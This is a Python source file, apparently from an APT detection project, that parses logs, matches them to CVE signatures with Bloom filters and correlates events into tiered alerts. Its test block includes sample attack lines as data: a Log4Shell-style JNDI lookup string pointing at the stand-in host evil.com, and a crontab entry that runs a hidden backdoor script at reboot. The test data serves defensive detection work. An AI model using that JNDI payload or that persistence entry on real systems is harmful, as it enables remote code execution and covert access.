"""
Main Log Processing Pipeline

Orchestrates the entire APT detection system:
1. Parse incoming logs
2. Check Pattern Bloom (Layer 1) for CVE signatures
3. Create event fingerprints for matches
4. Check Event Bloom (Layer 2) for temporal correlation
5. Generate tiered alerts

Target: 4.5 μs per log, 222K logs/sec (single-threaded)
"""

import time
import json
from typing import Dict, Any, List, Optional
from pathlib import Path

from ..bloom.pattern_bloom import PatternBloomManager, PatternMatch
from ..bloom.event_bloom import EventBloomManager, CorrelationResult
from ..bloom.bloom_config import BloomConfig
from ..signatures.cve_loader import CVELoader
from ..utils.fingerprint import FingerprintGenerator, EventFingerprint
from ..alerts.alert_manager import AlertManager, Alert
from ..utils.metrics import PerformanceMetrics


class LogProcessor:
    """Main log processing pipeline"""

    def __init__(
        self,
        cve_loader: CVELoader,
        config: BloomConfig = None
    ):
        """
        Initialize log processor

        Args:
            cve_loader: CVE signature loader
            config: Configuration
        """
        self.config = config or BloomConfig()
        self.cve_loader = cve_loader

        # Initialize components
        print("Initializing APT Detection System...")
        print("-" * 60)

        self.pattern_bloom = PatternBloomManager(cve_loader, config)
        self.event_bloom = EventBloomManager(config)
        self.fingerprint_gen = FingerprintGenerator()
        self.alert_manager = AlertManager(config)
        self.metrics = PerformanceMetrics()

        print(f"✓ Pattern Bloom initialized ({len(self.pattern_bloom.pattern_filters)} CVEs)")
        print(f"✓ Event Bloom initialized")
        print(f"✓ Alert Manager initialized")
        print("-" * 60)
        print("System ready for log processing\n")

    def process_log(self, log_entry: Dict[str, Any]) -> Optional[Alert]:
        """
        Process a single log entry through the detection pipeline

        Args:
            log_entry: Log entry dictionary with fields like:
                - log/message: Log text
                - timestamp: Event timestamp
                - source_ip: Source IP (optional)
                - target: Target asset (optional)

        Returns:
            Alert object if alert generated, None otherwise
        """
        start_time = time.perf_counter()

        # Extract log text
        log_text = log_entry.get('log') or log_entry.get('message', '')

        # Step 1: Check Pattern Bloom (Layer 1)
        pattern_matches = self.pattern_bloom.check_log(log_text)

        if not pattern_matches:
            # No CVE patterns detected - benign log
            elapsed_us = (time.perf_counter() - start_time) * 1_000_000
            self.metrics.record_log_processed(elapsed_us)
            return None

        # Record pattern match
        self.metrics.record_pattern_match()

        # Step 2: Process each pattern match
        alert = None
        for match in pattern_matches:
            # Create event fingerprint
            fingerprint = self.fingerprint_gen.create_fingerprint(
                log_entry=log_entry,
                cve_id=match.cve_id,
                stage=match.stage,
                technique_id=match.technique_id
            )

            # Step 3: Check Event Bloom (Layer 2) for correlation
            correlation_result = self.event_bloom.add_event(fingerprint)

            # Record correlation if multi-stage
            if correlation_result.is_multi_stage:
                self.metrics.record_correlation()

            # Step 4: Generate alert if needed
            if self.alert_manager.should_generate_alert(correlation_result):
                # Get all events in this campaign
                campaign_events = self.event_bloom.correlation_manager.get_campaign(
                    fingerprint.get_correlation_key()
                )

                # Get CVE name
                signature = self.cve_loader.get_signature(match.cve_id)
                cve_name = signature.name if signature else match.cve_id

                # Generate alert
                alert = self.alert_manager.generate_alert(
                    correlation_result=correlation_result,
                    campaign_events=campaign_events,
                    cve_name=cve_name
                )

                self.metrics.record_alert()

        # Record processing time
        elapsed_us = (time.perf_counter() - start_time) * 1_000_000
        self.metrics.record_log_processed(elapsed_us)

        # Sample memory periodically
        if self.metrics.metrics['logs_processed'] % 1000 == 0:
            self.metrics.sample_memory()

        return alert

    def process_logs_batch(self, log_entries: List[Dict[str, Any]]) -> List[Optional[Alert]]:
        """
        Process multiple logs in batch

        Args:
            log_entries: List of log entry dictionaries

        Returns:
            List of alerts (None for logs that didn't generate alerts)
        """
        return [self.process_log(log) for log in log_entries]

    def process_logs_from_file(self, file_path: str) -> List[Alert]:
        """
        Process logs from JSON file

        Args:
            file_path: Path to JSON file with log entries

        Returns:
            List of generated alerts
        """
        print(f"Processing logs from: {file_path}")

        with open(file_path, 'r') as f:
            log_entries = json.load(f)

        if not isinstance(log_entries, list):
            log_entries = [log_entries]

        alerts = []
        for i, log_entry in enumerate(log_entries):
            alert = self.process_log(log_entry)
            if alert:
                alerts.append(alert)
                print(f"\n[Alert {len(alerts)}] {alert.get_summary()}")

            # Progress indicator
            if (i + 1) % 1000 == 0:
                print(f"Processed {i + 1}/{len(log_entries)} logs...")

        print(f"\nProcessing complete: {len(log_entries)} logs, {len(alerts)} alerts generated")
        return alerts

    def print_stats(self):
        """Print comprehensive statistics"""
        print("\n" + "="*60)
        print("SYSTEM STATISTICS")
        print("="*60)

        # Performance metrics
        self.metrics.print_summary()

        # Pattern Bloom stats
        print("\nPattern Bloom (Layer 1):")
        pattern_stats = self.pattern_bloom.get_performance_stats()
        print(f"  Checks:          {pattern_stats['total_checks']:,}")
        print(f"  Matches:         {pattern_stats['total_matches']:,}")
        print(f"  Match rate:      {pattern_stats['match_rate']:.2%}")
        print(f"  Avg time:        {pattern_stats['avg_time_us']:.2f} μs")

        # Event Bloom stats
        print("\nEvent Bloom (Layer 2):")
        event_stats = self.event_bloom.get_performance_stats()
        print(f"  Events:          {event_stats['events_processed']:,}")
        print(f"  New campaigns:   {event_stats['new_campaigns']:,}")
        print(f"  Multi-stage:     {event_stats['multi_stage_detected']:,}")
        print(f"  APT campaigns:   {event_stats['apt_campaigns_detected']:,}")
        print(f"  Avg time:        {event_stats['avg_time_us']:.2f} μs")

        # Memory usage
        print("\nMemory Usage:")
        filter_stats = self.event_bloom.get_filter_stats()
        total_memory = (
            self.pattern_bloom.get_filter_stats()['estimated_memory_mb'] +
            filter_stats['estimated_memory_mb']
        )
        print(f"  Pattern filters: {self.pattern_bloom.get_filter_stats()['estimated_memory_mb']:.2f} MB")
        print(f"  Event filters:   {filter_stats['estimated_memory_mb']:.2f} MB")
        print(f"  Total estimate:  {total_memory:.2f} MB")
        print(f"  Actual current:  {self.metrics.get_current_memory_mb():.2f} MB")
        print(f"  Budget:          {self.config.max_memory_mb} MB")

        # Alert stats
        self.alert_manager.print_stats()

    def export_results(self, output_dir: str):
        """
        Export results to files

        Args:
            output_dir: Output directory path
        """
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)

        # Export alerts
        alerts_file = output_path / "alerts.json"
        self.alert_manager.export_alerts(str(alerts_file))

        # Export metrics
        metrics_file = output_path / "metrics.json"
        with open(metrics_file, 'w') as f:
            json.dump(self.metrics.get_summary(), f, indent=2)
        print(f"Exported metrics to {metrics_file}")

        # Export campaigns
        campaigns_file = output_path / "campaigns.json"
        campaigns = self.event_bloom.get_all_campaigns()
        with open(campaigns_file, 'w') as f:
            json.dump(campaigns, f, indent=2)
        print(f"Exported {len(campaigns)} campaigns to {campaigns_file}")

    def reset(self):
        """Reset all statistics and state"""
        self.pattern_bloom.reset_stats()
        self.event_bloom.reset_stats()
        self.metrics.reset()


if __name__ == "__main__":
    # Test log processor
    base_path = Path(__file__).parent.parent.parent

    # Initialize system
    cve_loader = CVELoader(base_path / "data/signatures/cve_signatures.json")
    processor = LogProcessor(cve_loader)

    # Test logs
    test_logs = [
        {
            'timestamp': '2024-10-01T10:00:00Z',
            'source_ip': '10.0.1.5',
            'target': 'nginx:1.19',
            'log': 'GET /api?q=${jndi:ldap://evil.com/exploit}'
        },
        {
            'timestamp': '2024-10-01T10:05:00Z',
            'source_ip': '10.0.2.10',
            'target': 'apache:2.4',
            'log': 'Normal GET request to /index.html'
        },
        {
            'timestamp': '2024-10-12T14:30:00Z',
            'source_ip': '10.0.1.5',
            'target': 'nginx:1.19',
            'log': 'POST /upload - Runtime.exec detected in payload'
        },
        {
            'timestamp': '2024-11-04T04:15:00Z',
            'source_ip': '10.0.1.5',
            'target': 'nginx:1.19',
            'log': 'crontab entry added: @reboot /tmp/.hidden/backdoor.sh'
        }
    ]

    print("Processing test logs...")
    print("="*60 + "\n")

    for i, log in enumerate(test_logs, 1):
        print(f"Log {i}: {log['log'][:60]}...")
        alert = processor.process_log(log)
        if alert:
            print(f"  → {alert.get_summary()}\n")
        else:
            print("  → No alert\n")

    # Print statistics
    processor.print_stats()
